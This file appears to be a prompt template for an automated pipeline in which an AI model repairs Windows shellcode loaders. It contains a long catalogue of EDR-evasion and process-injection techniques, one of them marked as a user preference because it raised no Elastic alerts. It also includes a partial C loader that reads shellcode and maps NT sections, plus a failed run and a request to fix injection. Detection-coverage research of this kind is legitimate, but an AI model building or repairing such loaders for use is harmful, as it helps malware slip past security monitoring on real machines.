@@ -1,0 +1,209 @@
+# Code Correction Task (Execution Failure)
+
+## Available Evasion Techniques (Reference)
+You may switch to a different technique if the current one is fundamentally broken.
+- **rwx_allocation**: Allocate memory with PAGE_EXECUTE_READWRITE (RWX) permissions directly. The simplest and most straightforward method of running shellcode.
+    - **RW_to_RX**: Allocate as PAGE_READWRITE, write shellcode, then VirtualProtect to PAGE_EXECUTE_READ. Avoids suspicious RWX permissions.
+    - **module_stomping**: Load legitimate DLL (ex: mshtml.dll, edgehtml.dll. NOT kernel32.dll), locate executable section, overwrite with shellcode. Uses existing executable memory.
+    - **module_stomping_section_mapping**: Module Stomping via NtCreateSection(SEC_IMAGE)+NtMapViewOfSection. Maps the sacrificial DLL as an image section (file-backed, RX) without a LoadLibrary event; shellcode overwrites the mapped .text in place. Keeps the module off the PEB loader list and makes call-stack module resolution point at a legitimate DLL path.
+    - **module_stomping_fiber** [USER-PREFERRED]: Module Stomping + Fiber: stomp a mapped image section, then start execution via CreateFiber/SwitchToFiber so no thread-creation telemetry is emitted. Workshop-verified combination that produced no Elastic alerts.
+    - **thread_hijacking_local**: Thread Hijacking (local): suspend an existing thread in the own process (e.g. created earlier or via CreateThread on a decoy), overwrite its RIP with the payload address via SetThreadContext, resume. Avoids a fresh thread-start pointing at unbacked memory.
+    - **apc_injection**: APC execution (self-injection): QueueUserAPC/NtQueueApcThread the payload address onto an alertable thread in the same process, then enter an alertable wait (SleepEx/WaitForSingleObjectEx). No new thread is created.
+    - **threadless_injection**: Threadless Injection (local variant): patch an existing function in a loaded module (or an unused callback slot, e.g. window proc) so the payload runs on a normal call path instead of a new thread. Pure-C feasible when targeting the own process; remote-process variants need handle ops and widen the detection surface.
+    - **heap_execution**: Use HeapCreate + HeapAlloc instead of VirtualAlloc. Less commonly monitored by EDR.
+    - **fiber_execution**: Use Windows Fiber API (ConvertThreadToFiber, CreateFiber) to execute shellcode in fiber context.
+    - **phantom_dll_hollowing**: Map DLL as SEC_IMAGE_NO_EXECUTE, modify in memory, then remap sections as executable. Advanced evasion.
+    - **thread_stack_spoofing**: Overwrite the return address on the stack or use synthetic frames to hide the true origin of the execution (e.g., hiding the pointer to unbacked memory).
+    - **dll_side_loading**: DLL side-loading: drop a payload-bearing DLL next to a signed binary that imports it, so execution flows under a trusted image name.
+    - **mockingjay**: Mockingjay: reuse an existing PAGE_EXECUTE_READWRITE section inside a signed DLL (e.g. msys-2.0.dll) — no VirtualAlloc/VirtualProtect at all; writes land in image-backed executable memory.
+    - **early_bird_apc**: Early Bird APC: spawn a signed host process suspended and queue an APC before its first thread runs, so the payload executes during process init — potentially before userland EDR hooks install.
+    - **ntdll_unhooking**: NTDLL unhooking: restore ntdll .text bytes from KnownDlls or a clean on-disk copy to remove inline EDR hooks before running the payload. Auxiliary step — combine with a staging technique.
+    - **direct_syscall**: Direct/indirect syscalls (HellsGate-style): resolve SSNs from ntdll stubs and invoke the kernel without passing through hooked ntdll prologues. Does not affect kernel-level telemetry.
+    - **process_hollowing_remote**: Remote process hollowing (classic T1055): CreateProcess suspended, NtUnmapViewOfSection the original image, write replacement code, redirect entry, resume. Baseline to measure Elastic hollowing-rule coverage.
+    - **proxy_function_calls**: Execute sensitive APIs (NtCreateThread, etc.) through 'gadgets' in legitimate DLLs like ntdll.dll or kernel32.dll to evade return address filtering.
+    - **process_doppelganging**: Create file transaction, write shellcode, rollback transaction but keep section handle. Execute from transacted memory.
+    - **callback_execution**: Use legitimate callback functions (EnumWindows, EnumSystemLocales, etc.) with shellcode address.
+    - **module_overloading**: Map same DLL twice - once legitimate, once modified. Use legitimate handle for cover.
+    - **atom_bombing**: Atom bombing: store shellcode in the global atom table, then NtQueueApcThread a GlobalGetAtomNameW call into a target thread so the atom content is written inside the target process — no WriteProcessMemory.
+    - **tls_callback**: TLS callback execution: register a PIMAGE_TLS_CALLBACK in the .CRT$XL* section so the payload runs inside LdrpCallTlsInitializers before main — no thread/APC creation.
+    - **propagate**: PROPagate: store payload/subclass header in a target window's property list and trigger it via window messages — injection through the windowing subsystem, not process APIs.
+    - **process_ghosting**: Process ghosting: create a file, mark delete-pending, write a payload PE, build a SEC_IMAGE section from the delete-pending handle, then close — a process whose image has no on-disk file at all.
+    - **windows_hook_injection**: SetWindowsHookEx injection: the OS itself loads our hook DLL into a target GUI process when it pumps messages — no remote alloc/write APIs involved.
+    - **context_gadget**: SetThreadContext + gadget: redirect a thread's RIP into a jmp/call gadget inside a signed module so the first stack frame is module-backed even though control reaches the payload next.
+    - **exception_dispatch_exec**: Exception-dispatched execution: a VEH handler rewrites ContextRecord->Rip to the payload and returns CONTINUE_EXECUTION — control transfer happens inside KiUserExceptionDispatcher.
+    - **remote_section_mapping**: Remote section mapping: write payload in our own view of a section object, then NtMapViewOfSection the same section into the target — no VirtualAllocEx/WriteProcessMemory pair.
+    - **rundll32_hosting**: Signed host execution: drop a payload DLL and run it under rundll32/regsvr32 — the hosting process is a signed system binary, which may break unsigned-parent rule sequences.
+    - **suspended_section_exec**: Suspended-process section write: spawn signed host suspended, NtMapViewOfSection a payload section into it, redirect the main thread — hollowing-style exec without the loud NtUnmapViewOfSection call.
+    - **scattered_allocation**: Split shellcode across multiple small allocations. Reconstruct at runtime. Evades signature scanning.
+    - **read_only_trick**: Allocate as PAGE_READONLY, use hardware breakpoint or exception handler to execute. Very stealthy.
+    - **inherited_section_apc**: Inherited-Handle Section APC: pass a payload-carrying section into a suspended child via PROC_THREAD_ATTRIBUTE_HANDLE_LIST so the kernel duplicates the handle at process creation — no VirtualAllocEx/WriteProcessMemory/remote-map event exists. The child maps the section locally; trigger via early-bird APC or gadget/context redirect. Project-original composition.
+    - **self_reflection_exec**: Self-Reflection Execution: RtlCreateProcessReflection/RtlCloneUserProcess forks our own process after local staging — the payload is inherited at birth (COW), so no remote alloc/write/map call exists at all. StartRoutine option runs the payload inside the clone without a CreateThread-named call.
+    - **api_surface_translation**: API Surface Translation (meta): substitute every fingerprinted Win32 call with a documented modern twin (VirtualAlloc2, MapViewOfFile3, NtMapViewOfSectionEx, VirtualProtectFromApp, CreateFile2, NtCreateThreadEx flags, placeholder APIs) — tests whether rules match api.name strings. Applied on top of other techniques; one-iteration test per rule family.
+
+    ### USER PREFERRED TECHNIQUES (Prioritize these!)
+    - **module_stomping_fiber**
+
+## Context
+The code compiled but failed during execution (crash, early exit, or shellcode loading failure).
+
+## Previous Code (C source that failed at runtime)
+```c
+#define _CRT_SECURE_NO_WARNINGS
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* ---------- NT type declarations (winternl.h is incomplete) ---------- */
+typedef LONG NTSTATUS;
+#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
+
+#ifndef STATUS_SUCCESS
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+#endif
+
+typedef struct _UNICODE_STRING_LOCAL {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING_LOCAL, *PUNICODE_STRING_LOCAL;
+
+typedef struct _OBJECT_ATTRIBUTES_LOCAL {
+    ULONG           Length;
+    HANDLE          RootDirectory;
+    PUNICODE_STRING_LOCAL ObjectName;
+    ULONG           Attributes;
+    PVOID           SecurityDescriptor;
+    PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES_LOCAL, *POBJECT_ATTRIBUTES_LOCAL;
+
+typedef struct _IO_STATUS_BLOCK_LOCAL {
+    union { NTSTATUS Status; PVOID Pointer; };
+    ULONG_PTR Information;
+} IO_STATUS_BLOCK_LOCAL, *PIO_STATUS_BLOCK_LOCAL;
+
+typedef enum _SECTION_INHERIT_LOCAL {
+    ViewShare = 1,
+    ViewUnmap = 2
+} SECTION_INHERIT_LOCAL;
+
+/* NT prototypes */
+typedef NTSTATUS (NTAPI *pNtOpenFile)(
+    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES_LOCAL,
+    PIO_STATUS_BLOCK_LOCAL, ULONG, ULONG);
+
+typedef NTSTATUS (NTAPI *pNtCreateSection)(
+    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES_LOCAL,
+    PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+
+typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
+    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
+    PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT_LOCAL, ULONG, ULONG);
+
+typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
+
+typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
+    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+
+typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);
+
+/* ---------- helpers ---------- */
+static void init_unicode_string(PUNICODE_STRING_LOCAL us, PCWSTR src) {
+    size_t len = wcslen(src);
+    us->Length        = (USHORT)(len * sizeof(WCHAR));
+    us->MaximumLength = (USHORT)((len + 1) * sizeof(WCHAR));
+    us->Buffer        = (PWSTR)src;
+}
+
+static void init_object_attributes(POBJECT_ATTRIBUTES_LOCAL oa,
+                                   PUNICODE_STRING_LOCAL name) {
+    oa->Length                   = sizeof(OBJECT_ATTRIBUTES_LOCAL);
+    oa->RootDirectory            = NULL;
+    oa->ObjectName               = name;
+    oa->Attributes               = OBJ_CASE_INSENSITIVE;
+    oa->SecurityDescriptor       = NULL;
+    oa->SecurityQualityOfService = NULL;
+}
+
+/* Read the whole file into a heap buffer. Caller frees. */
+static unsigned char *read_file(const char *path, size_t *out_size) {
+    FILE *fp = fopen(path, "rb");
+    if (!fp) { fprintf(stderr, "[-] fopen failed: %s\n", path); return NULL; }
+    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
+    long sz = ftell(fp);
+    if (sz <= 0) { fclose(fp); return NULL; }
+    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }
+    unsigned char *buf = (unsigned char *)malloc((size_t)sz);
+    if (!buf) { fclose(fp); return NULL; }
+    size_t rd = fread(buf, 1, (size_t)sz, fp);
+    fclose(fp);
+    if (rd != (size_t)sz) { free(buf); return NULL; }
+    *out_size = (size_t)sz;
+    return buf;
+}
+
+/* Build a \??\C:\... NT path from a Win32 absolute path. */
+static void build_nt_path(WCHAR *dst, size_t dst_cch, const char *win32_path) {
+    WCHAR wide[MAX_PATH];
+    MultiByteToWideChar(CP_ACP, 0, win32_path, -1, wide, MAX_PATH);
+    _snwprintf_s(dst, dst_cch, _TRUNCATE, L"\\??\\%ls", wide);
+}
+
+/* ---------- main ---------- */
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
+        return 1;
+    }
+
+    /* 1. Read shellcode from file (no hardcoded bytes). */
+    size_t sc_size = 0;
+    unsigned char *sc = read_file(argv[1], &sc_size);
+    if (!sc) { fprintf(stderr, "[-] failed to read shellcode\n"); return 1; }
+    printf("[+] loaded %zu bytes of shellcode\n", sc_size);
+
+    /* 2. Resolve NT APIs dynamically from ntdll.dll. */
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) { free(sc); return 1; }
+
+    pNtOpenFile             NtOpenFile             = (pNtOpenFile)            GetProcAddress(hNtdll, "NtOpenFile");
+    pNtCreateSection        NtCreateSection        = (pNtCreateSection)       GetProcAddress(hNtdll, "NtCreateSection");
+    pNtMapViewOfSection     NtMapViewOfSection     = (pNtMapViewOfSection)    GetProcAddress(hNtdll, "NtMapViewOfSection");
+    pNtUnmapViewOfSection   NtUnmapViewOfSection   = (pNtUnmapViewOfSection)  GetProcAddress(hNtdll, "NtUnmapViewOfSection");
+    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
+    pNtClose                NtClose                = (pNtClose)               GetProcAddress(hNtdll, "NtClose");
+
+    if (!NtOpenFile || !NtCreateSection || !NtMapViewOfSection ||
+        !NtUnmapViewOfSection || !NtProtectVirtualMemory || !NtClose) {
+        fprintf(stderr, "[-] failed to resolve NT APIs\n");
+   
+
+... (truncated)
+```
+
+## Execution Output
+EXECUTION FAILED:
+[-] NtCreateSection failed: 0xC0000022
+
+
+EXIT_CODE: 1
+
+SUCCESS_DETAILS: {'process_expected': 'calc.exe', 'message': 'Process calc.exe was NOT spawned by this loader within 15s'}
+
+STDOUT:
+
+
+STDERR:
+[-] NtCreateSection failed: 0xC0000022
+
+
+## Task
+1. Analyze the runtime behavior.
+2. Identify the logical flaw or crash reason.
+3. Propose a fix to ensure successful execution (shellcode injection and thread start).
+
+## Output Format
+**Analysis**: [Explain the runtime failure]
+**Rule_Analysis**: N/A (Execution Error)
+**Technique**: BugFix
+**Methodology**: [Specific fix, e.g. "Fix memory alignment in VirtualAlloc"]
